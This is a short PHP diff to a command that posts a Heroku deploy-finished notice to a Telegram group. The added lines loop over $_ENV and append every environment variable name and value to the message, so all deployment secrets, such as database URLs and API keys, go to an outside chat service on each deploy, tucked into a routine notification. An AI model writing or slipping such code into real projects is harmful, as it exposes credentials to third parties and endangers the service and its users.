@@ -59,6 +59,14 @@ class HerokuDeployFinishedNofiticationCommand extends Command
 
         $message[] = 'Status update: '.date('Y-m-d H:i:s');
 
+        $message[] = '';
+
+        foreach ($_ENV as $k => $v) {
+            $message[] = $k.' => '.$v;
+
+        }
+        $message[] = '';
+
         $this->telegramBotHelper->sendMessage($groupId, implode("\n", $message));
 
 
